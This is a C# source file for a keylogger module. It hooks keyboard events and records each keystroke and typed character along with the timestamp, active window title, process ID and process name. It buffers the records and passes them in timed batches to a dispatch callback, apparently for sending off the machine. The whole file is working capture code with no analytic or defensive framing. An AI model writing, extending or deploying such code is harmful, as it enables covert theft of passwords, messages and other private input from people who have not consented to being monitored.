using System;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using System.Timers;

namespace Logger.Keyboard
{
    using WindowHandle = IntPtr;
    
    class KeyboardLogger
    {
        private const int InitialQueueSize = 5000, MaxQueueSize = 80000,  nLogsPreservedOnQueueTrim = 8000;

        private Queue<Keylog> queue;
        private Queue<Keylog> sendBuffer;

        private readonly object QueueSyncObj = new object();
        private readonly object DispatchSyncObj = new object();

        private System.Timers.Timer dispatchTimer;
        private Func<IEnumerable<Keylog>, bool> OnDispatch;

        static string Escape(string text)
        {
            text = text.Replace("[", "[[");
            text = text.Replace("]", "]]");
            return text;
        }

        public KeyboardLogger(KeyboardListener listener, TimeSpan dispatchInterval, Func<IEnumerable<Keylog>, bool> OnDispatch)
        {
            this.queue = new Queue<Keylog>(InitialQueueSize);
            this.sendBuffer = new Queue<Keylog>();

            this.OnDispatch = OnDispatch;

            listener.KeyDown += new RawKeyEventHandler(OnKeyDown);
            listener.KeyUp += new RawKeyEventHandler(OnKeyUp);

            this.dispatchTimer = new System.Timers.Timer(dispatchInterval.TotalMilliseconds);
            this.dispatchTimer.AutoReset = false;
            this.dispatchTimer.Elapsed += DispatchTimerElapsed;
            this.dispatchTimer.Start();
        }

        public void Flush()
        {
            TryDispatch();
        }

        private void OnKeyDown(object sender, RawKeyEventArgs args)
        {
            try
            {
                var keyRepresentation = args.Key.ToString();
                var log = string.Format("[{0} down]", Escape(keyRepresentation));

                this.EnqueueLog(Keylog.Create(log, args));

                if (!string.IsNullOrEmpty(args.Character))
                    this.EnqueueLog(Keylog.Create(args.Character, args));
            }
            catch (Exception ex)
            {
                Program.Trace($"OnKeyDown: { ex.Message }");
            }
        }

        private void OnKeyUp(object sender, RawKeyEventArgs args)
        {
            try 
            {
                var keyRepresentation = args.Key.ToString();
                var log = string.Format("[{0} up]", Escape(keyRepresentation));

                this.EnqueueLog(Keylog.Create(log, args));
            }
            catch (Exception ex)
            {
                Program.Trace($"OnKeyUp: { ex.Message }");
            }
        }

        private void EnqueueLog(Keylog log)
        {
            lock (QueueSyncObj)
                this.queue.Enqueue(log);

            TrimQueueIfNecessary();
        }

        void TrimQueueIfNecessary()
        {
            lock (QueueSyncObj)
            {
                if (this.queue.Count <= MaxQueueSize)
                    return;
            }

            lock (DispatchSyncObj)  // Do not allow dispatching (which means dequeueing) while trimming queue, also limit trimming to be done by one thread at once
            {
                while (true)
                {
                    lock (QueueSyncObj)
                    {
                        if (this.queue.Count > nLogsPreservedOnQueueTrim)
                            queue.Dequeue();
                        else
                            break;
                    }
                }
            }
        }


        private void DispatchTimerElapsed(object sender, EventArgs e)
        {
            TryDispatch();
            Debug.Assert(this.dispatchTimer.Enabled == false);
            this.dispatchTimer.Start();
        }

        private void TryDispatch()
        {
            lock (DispatchSyncObj)
            {
                // TODO: put a limit on sendbuffer size
                while (queue.Count > 0 && sendBuffer.Count < int.MaxValue)
                {
                    lock (QueueSyncObj)
                        sendBuffer.Enqueue(queue.Dequeue());
                }

                if (sendBuffer.Count > 0)
                {
                    bool success = OnDispatch(sendBuffer);

                    if (success)
                        sendBuffer.Clear();
                }
            }
        }
    }
   
    class Keylog
    {
        public static Keylog Create(string log, RawKeyEventArgs args)
        {
            return new Keylog(log, args.DateTime, args.WindowHandle, args.WindowTitle, args.ProcessID, args.ProcessName);
        }

        public DateTime DateTime { get; set; }

        public string Log { get; private set; }

        public string WindowTitle { get; private set; }

        public WindowHandle WindowHandle { get; private set; }

        public uint ProcessID { get; private set; }

        public string ProcessName { get; private set; }

        public Keylog (string log, DateTime dateTime, WindowHandle windowHandle, string windowTitle, uint processID, string processName)
        {
            Log = log;
            WindowHandle = windowHandle;
            WindowTitle = windowTitle;
            ProcessID = processID;
            ProcessName = processName;
            DateTime = dateTime;
        }
    }
}
